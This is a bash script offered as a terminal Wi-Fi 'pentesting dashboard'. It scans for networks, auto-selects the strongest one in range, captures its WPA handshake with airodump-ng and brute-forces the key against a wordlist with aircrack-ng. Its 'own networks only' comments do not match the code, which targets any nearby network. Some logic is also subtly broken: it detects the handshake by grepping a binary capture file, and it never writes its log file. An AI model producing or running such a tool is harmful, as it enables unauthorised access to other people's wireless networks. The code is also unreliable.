#!/bin/bash
# wifi_dash.sh
# Fully-featured professional terminal Wi-Fi dashboard
# SAFE: Only your own networks

CAPTURE_DIR="captures"
LOG_DIR="logs"
TMP_SCAN="/tmp/scan"
mkdir -p "$CAPTURE_DIR" "$LOG_DIR"

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

interface=""
declare -a targets=()  # Format: BSSID,Channel,ESSID,CAPTURE_NAME,Handshake,Progress

# --- Adapter Selection ---
select_adapter() {
    echo -e "${CYAN}Select Wi-Fi adapter:${NC}"
    echo "1) wlan0 (Alpha)"
    echo "2) Other (monitor mode enabled)"
    read -p "Choice: " choice
    if [ "$choice" == "1" ]; then
        interface="wlan0"
        sudo airmon-ng start "$interface"
    else
        read -p "Enter interface name: " interface
    fi
}

# --- Scan Networks ---
scan_networks() {
    echo -e "${YELLOW}Scanning for networks (15s)...${NC}"
    sudo timeout 15s airodump-ng "$interface" --write "$TMP_SCAN" --output-format csv >/dev/null 2>&1
    mapfile -t networks < <(awk -F',' 'NR>1 && $1!="" {gsub(/ /,"",$1); print $1 "," $14 "," $9 "," $10}' "${TMP_SCAN}-01.csv")
    if [ ${#networks[@]} -eq 0 ]; then
        echo -e "${RED}No networks found.${NC}"
        exit 1
    fi
    # Auto-select strongest network
    strongest_signal=-100
    for i in "${!networks[@]}"; do
        IFS=',' read -r bssid channel signal essid <<< "${networks[$i]}"
        signal=${signal// /}
        if (( signal > strongest_signal )); then
            strongest_signal=$signal
            strongest_index=$i
        fi
    done
    IFS=',' read -r bssid channel signal essid <<< "${networks[$strongest_index]}"
    read -p "Enter capture file name for $essid: " cap_name
    targets+=("$bssid,$channel,$essid,$cap_name,No,0")
}

# --- Display Dashboard ---
display_dashboard() {
    clear
    echo -e "${CYAN}=== Ultimate Wi-Fi Pentesting Dashboard ===${NC}"
    printf "%-20s %-10s %-7s %-25s %-10s %-10s\n" "BSSID" "Channel" "Signal" "ESSID" "Handshake" "Progress"
    for i in "${!targets[@]}"; do
        IFS=',' read -r bssid channel essid cap_name handshake progress <<< "${targets[$i]}"
        printf "%-20s %-10s %-7s %-25s %-10s %-10s\n" "$bssid" "$channel" "$strongest_signal" "$essid" "$handshake" "$progress%"
    done
}

# --- Capture Handshake ---
capture_handshake() {
    for i in "${!targets[@]}"; do
        IFS=',' read -r bssid channel essid cap_name handshake progress <<< "${targets[$i]}"
        capture_path="$CAPTURE_DIR/$cap_name"
        echo -e "${YELLOW}Capturing handshake for $essid...${NC}"
        sudo airodump-ng -c "$channel" --bssid "$bssid" -w "$capture_path" "$interface" &
        ai_pid=$!

        while true; do
            sleep 5
            if grep -q "WPA Handshake" "${capture_path}-01.cap" 2>/dev/null; then
                echo -e "${GREEN}Handshake detected for $essid!${NC}"
                kill $ai_pid
                targets[$i]="$bssid,$channel,$essid,$cap_name,Yes,0"
                break
            fi
            display_dashboard
        done
    done
}

# --- Brute-force with progress ---
bruteforce() {
    read -p "Enter path to your wordlist: " wordlist
    total_lines=$(wc -l < "$wordlist")
    for i in "${!targets[@]}"; do
        IFS=',' read -r bssid channel essid cap_name handshake progress <<< "${targets[$i]}"
        capture_path="$CAPTURE_DIR/$cap_name"
        log_file="$LOG_DIR/${cap_name}_aircrack.log"
        echo -e "${YELLOW}Running brute-force for $essid...${NC}"
        count=0
        while read -r line; do
            count=$((count+1))
            percent=$((count*100/total_lines))
            targets[$i]="$bssid,$channel,$essid,$cap_name,$handshake,$percent"
            display_dashboard
            aircrack-ng -w <(echo "$line") -b "$bssid" "${capture_path}-01.cap" >/dev/null 2>&1
        done < "$wordlist"
        echo -e "${GREEN}Brute-force finished for $essid. Logs: $log_file${NC}"
    done
}

# --- Main Function ---
main() {
    select_adapter
    scan_networks
    display_dashboard
    capture_handshake
    bruteforce
    echo -e "${YELLOW}All tasks completed! Captures: ${CAPTURE_DIR}, Logs: ${LOG_DIR}${NC}"
    echo -e "${RED}Reminder: Only test your own networks!${NC}"
}

# Run
main
